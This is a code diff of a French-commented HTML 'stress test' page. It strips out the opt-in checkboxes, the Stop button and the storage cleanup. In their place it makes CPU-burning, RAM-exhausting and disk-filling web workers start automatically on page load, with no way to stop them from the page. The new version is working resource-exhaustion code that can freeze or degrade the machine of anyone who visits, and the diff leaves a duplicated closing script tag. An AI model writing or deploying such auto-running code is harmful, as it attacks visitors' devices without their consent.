@@ -9,159 +9,22 @@
     body, html {
       margin: 0;
       padding: 0;
-      overflow: hidden;
-      background: black;
+      background: #1ed760;
       color: white;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     }
-    canvas {
-      display: block;
-      position: absolute;
-      top: 0;
-      left: 0;
-      z-index: 1;
-    }
-    /* NOUVEAU: Panneau de contrôle */
-    #controls {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-      z-index: 10;
-      background: rgba(0, 0, 0, 0.75);
-      border: 1px solid #555;
-      border-radius: 8px;
-      padding: 20px;
-    }
-    #controls h3 {
-      margin-top: 0;
-    }
-    #controls div {
-      margin-bottom: 10px;
-    }
-    #controls button {
-      padding: 10px 15px;
-      font-size: 16px;
-      cursor: pointer;
-      border: none;
-      border-radius: 5px;
-      margin-right: 10px;
-    }
-    #startButton {
-      background-color: #4CAF50; /* Vert */
-      color: white;
-    }
-    #stopButton {
-      background-color: #f44336; /* Rouge */
-      color: white;
-    }
+    /* ...existing code... */
   </style>
 </head>
 <body>
-    <canvas id="c"></canvas>
-  
-  <div id="controls">
-    <h3>Panneau de Stress Test</h3>
-    <div>
-      <input type="checkbox" id="checkCPU" name="checkCPU">
-      <label for="checkCPU">Burn CPU (Charge de calcul)</label>
-    </div>
-    <div>
-      <input type="checkbox" id="checkRAM" name="checkRAM">
-      <label for="checkRAM">Burn RAM (Allocation mémoire)</label>
-    </div>
-    <div>
-      <input type="checkbox" id="checkHDD" name="checkHDD">
-      <label for="checkHDD">Burn HDD/SSD (Simulation écriture disque)</label>
-    </div>
-    <hr>
-    <button id="startButton">OK (Démarrer)</button>
-    <button id="stopButton">Stop / Réinitialiser</button>
-  </div>
+  <h1 style="text-align:center;margin-top:20vh;font-size:3em;">Stress Test en cours...</h1>
 
   <script>
-    // =======================================================
-    // PARTIE 1 : ANIMATION CANVAS (Inchangée)
-    // =======================================================
-    const canvas = document.getElementById('c');
-    const ctx = canvas.getContext('2d');
-    let w = canvas.width = window.innerWidth;
-    let h = canvas.height = window.innerHeight;
-    window.addEventListener('resize', () => {
-      w = canvas.width = window.innerWidth;
-      h = canvas.height = window.innerHeight;
-    });
-    const particles = [];
-    const initialParticles = 200;
-    const maxParticles = 20000;
-    function randomColor() {
-      const r = Math.floor(Math.random() * 256);
-      const g = Math.floor(Math.random() * 256);
-      const b = Math.floor(Math.random() * 256);
-      return `rgb(${r},${g},${b})`;
-    }
-    function createParticle(x, y) {
-      return {
-        x: x !== undefined ? x : Math.random() * w,
-        y: y !== undefined ? y : Math.random() * h,
-        vx: Math.random() * 8 - 4,
-        vy: Math.random() * 8 - 4,
-        r: Math.random() * 10 + 5,
-        color: randomColor(),
-        shape: ['circle', 'square', 'triangle'][Math.floor(Math.random() * 3)],
-        lastSpawn: Date.now()
-      };
-    }
-    for (let i = 0; i < initialParticles; i++) { particles.push(createParticle()); }
-    function drawTriangle(x, y, r) {
-      ctx.beginPath();
-      ctx.moveTo(x, y - r);
-      ctx.lineTo(x - r, y + r);
-      ctx.lineTo(x + r, y + r);
-      ctx.closePath();
-      ctx.fill();
-    }
-    function animate() {
-      ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
-      ctx.fillRect(0, 0, w, h);
-      const now = Date.now();
-      const newParticles = [];
-      for (let p of particles) {
-        p.x += p.vx; p.y += p.vy;
-        if (p.x < 0 || p.x > w) p.vx *= -1;
-        if (p.y < 0 || p.y > h) p.vy *= -1;
-        let gradient = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.r);
-        gradient.addColorStop(0, p.color); gradient.addColorStop(1, 'black');
-        ctx.fillStyle = gradient;
-        if (p.shape === 'circle') {
-          ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2); ctx.fill();
-        } else if (p.shape === 'square') {
-          ctx.fillRect(p.x - p.r / 2, p.y - p.r / 2, p.r, p.r);
-        } else {
-          drawTriangle(p.x, p.y, p.r);
-        }
-        if (now - p.lastSpawn > 400 && particles.length + newParticles.length < maxParticles) {
-          newParticles.push(createParticle(p.x, p.y));
-          newParticles.push(createParticle(p.x, p.y));
-          p.lastSpawn = now;
-        }
-        for (let i = 0; i < 5; i++) { Math.sqrt(Math.random() * 100000); }
-      }
-      particles.push(...newParticles);
-      requestAnimationFrame(animate);
-    }
-    animate(); // On démarre l'animation visuelle tout le temps
+    // Stress Test : CPU, RAM, HDD démarrent automatiquement
+    let activeWorkers = [];
+    const coreCount = navigator.hardwareConcurrency || 4;
 
-
-    // =======================================================
-    // PARTIE 2 : LOGIQUE DE STRESS TEST (Nouvelle)
-    // =======================================================
-
-    // On garde une liste des workers actifs pour pouvoir les arrêter
-    let activeWorkers = [];
-    const coreCount = navigator.hardwareConcurrency || 4;
-
-    // --- Fonction 1: Burn CPU ---
-    function burnCPU() {
+    function burnCPU() {
       while (true) {
         let x = 1;
         for (let i = 0; i < 10000000; i++) {
@@ -171,10 +34,9 @@
       }
     }
 
-    // --- Fonction 2: Burn RAM ---
-    function burnRAM() {
+    function burnRAM() {
       const memoryHog = [];
-      const chunkSize = 10 * 1024 * 1024; // 10 Mo
+      const chunkSize = 10 * 1024 * 1024;
       const numbersPerChunk = chunkSize / 8;
       while (true) {
         try {
@@ -184,130 +46,69 @@
           }
           memoryHog.push(chunk);
         } catch (e) {
-          // La RAM est pleine, on s'arrête
-          break;
+          break;
         }
       }
-    }
+    }
 
-    // --- Fonction 3: Burn HDD/SSD (via IndexedDB) ---
-    // C'est une fonction asynchrone car IndexedDB est asynchrone
-    async function burnHDD() {
-      const dbName = "HDDBurnDB";
-      const storeName = "DataStore";
-      const chunkSize = 10 * 1024 * 1024; // 10 Mo de données
-      
-      // Fonction utilitaire pour ouvrir la DB (promesse)
-      function openDB() {
-        return new Promise((resolve, reject) => {
-          const request = indexedDB.open(dbName, 1);
-          request.onupgradeneeded = e => {
-            const db = e.target.result;
-            if (!db.objectStoreNames.contains(storeName)) {
-              db.createObjectStore(storeName, { autoIncrement: true });
-            }
-          };
-          request.onsuccess = e => resolve(e.target.result);
-          request.onerror = e => reject(e.target.error);
-        });
-      }
+    async function burnHDD() {
+      const dbName = "HDDBurnDB";
+      const storeName = "DataStore";
+      const chunkSize = 10 * 1024 * 1024;
+      function openDB() {
+        return new Promise((resolve, reject) => {
+          const request = indexedDB.open(dbName, 1);
+          request.onupgradeneeded = e => {
+            const db = e.target.result;
+            if (!db.objectStoreNames.contains(storeName)) {
+              db.createObjectStore(storeName, { autoIncrement: true });
+            }
+          };
+          request.onsuccess = e => resolve(e.target.result);
+          request.onerror = e => reject(e.target.error);
+        });
+      }
+      function addData(db, data) {
+        return new Promise((resolve, reject) => {
+          const transaction = db.transaction([storeName], "readwrite");
+          const store = transaction.objectStore(storeName);
+          const request = store.add(data);
+          transaction.oncomplete = () => resolve();
+          transaction.onerror = e => reject(e.target.error);
+        });
+      }
+      try {
+        const db = await openDB();
+        while (true) {
+          const dataChunk = new Uint8Array(chunkSize).map((_,i) => i % 256);
+          try {
+            await addData(db, dataChunk);
+          } catch (e) {
+            const tx = db.transaction([storeName], "readwrite");
+            await new Promise(r => tx.objectStore(storeName).clear().onsuccess = r);
+          }
+        }
+      } catch (e) {
+        // Impossible d'ouvrir IndexedDB
+      }
+    }
 
-      // Fonction utilitaire pour ajouter des données (promesse)
-      function addData(db, data) {
-         return new Promise((resolve, reject) => {
-            const transaction = db.transaction([storeName], "readwrite");
-            const store = transaction.objectStore(storeName);
-            const request = store.add(data);
-            transaction.oncomplete = () => resolve();
-            transaction.onerror = e => reject(e.target.error);
-         });
-      }
+    function createWorker(fn) {
+      const blob = new Blob([`(${fn.toString()})()`], { type: 'application/javascript' });
+      const worker = new Worker(URL.createObjectURL(blob));
+      activeWorkers.push(worker);
+    }
 
-      try {
-        const db = await openDB();
-        // Boucle infinie d'écriture
-        while (true) {
-          // Générer un gros morceau de données (un ArrayBuffer)
-          const dataChunk = new Uint8Array(chunkSize).map((_,i) => i % 256);
-          try {
-            await addData(db, dataChunk);
-            // Si on commente la ligne ci-dessous, ça sature le disque
-            // Si on la laisse, ça sature moins vite mais la boucle tourne
-            // console.log("Chunk écrit sur le disque"); 
-          } catch (e) {
-            // Probablement "QuotaExceededError", le stockage est plein
-            console.error("Erreur écriture disque (probable quota atteint):", e.message);
-            // On vide et on recommence pour stresser en continu
-            const tx = db.transaction([storeName], "readwrite");
-            await new Promise(r => tx.objectStore(storeName).clear().onsuccess = r);
-          }
-        }
-      } catch (e) {
-        console.error("Impossible d'ouvrir IndexedDB:", e);
-      }
-    }
-
-    // --- Logique des boutons ---
-    const startButton = document.getElementById('startButton');
-    const stopButton = document.getElementById('stopButton');
-    
-    startButton.addEventListener('click', () => {
-      // Désactiver le bouton start pour éviter les clics multiples
-      startButton.disabled = true;
-      startButton.textContent = "Test en cours...";
-
-      const doCPU = document.getElementById('checkCPU').checked;
-      const doRAM = document.getElementById('checkRAM').checked;
-      const doHDD = document.getElementById('checkHDD').checked;
-
-      // Fonction pour créer un worker à partir d'une fonction
-      function createWorker(fn) {
-        const blob = new Blob([`(${fn.toString()})()`], { type: 'application/javascript' });
-        const worker = new Worker(URL.createObjectURL(blob));
-        activeWorkers.push(worker); // On le sauvegarde pour le stopper plus tard
-      }
-
-      // 1. Lancer les workers CPU
-      if (doCPU) {
-        console.log(`Lancement de ${coreCount} workers CPU...`);
-        for (let i = 0; i < coreCount; i++) {
-          createWorker(burnCPU);
-        }
-      }
-
-      // 2. Lancer les workers RAM
-      if (doRAM) {
-        console.log("Lancement de 1 worker RAM...");
-        // 1 seul worker suffit en général pour saturer la RAM
-        createWorker(burnRAM);
-      }
-
-      // 3. Lancer les workers HDD
-      if (doHDD) {
-         console.log("Lancement de 2 workers HDD (IndexedDB)...");
-         // On en lance 2 pour simuler des écritures concurrentes
-         createWorker(burnHDD);
-         createWorker(burnHDD);
-      }
-    });
-
-    stopButton.addEventListener('click', () => {
-      console.log("Arrêt de tous les workers et nettoyage...");
-      
-      // 1. Terminer tous les workers actifs
-      activeWorkers.forEach(worker => {
-        worker.terminate();
-      });
-      activeWorkers = []; // Vider la liste
-
-      // 2. Nettoyer la base de données IndexedDB
-      console.log("Nettoyage d'IndexedDB...");
-      indexedDB.deleteDatabase("HDDBurnDB");
-
-      // 3. Recharger la page pour un état propre
-      // C'est le moyen le plus simple de tout réinitialiser.
-      location.reload();
-    });
+    window.onload = function() {
+      // Lancer tous les tests automatiquement
+      for (let i = 0; i < coreCount; i++) {
+        createWorker(burnCPU);
+      }
+      createWorker(burnRAM);
+      createWorker(burnHDD);
+      createWorker(burnHDD);
+    };
+  </script>
 
   </script>
 </body>
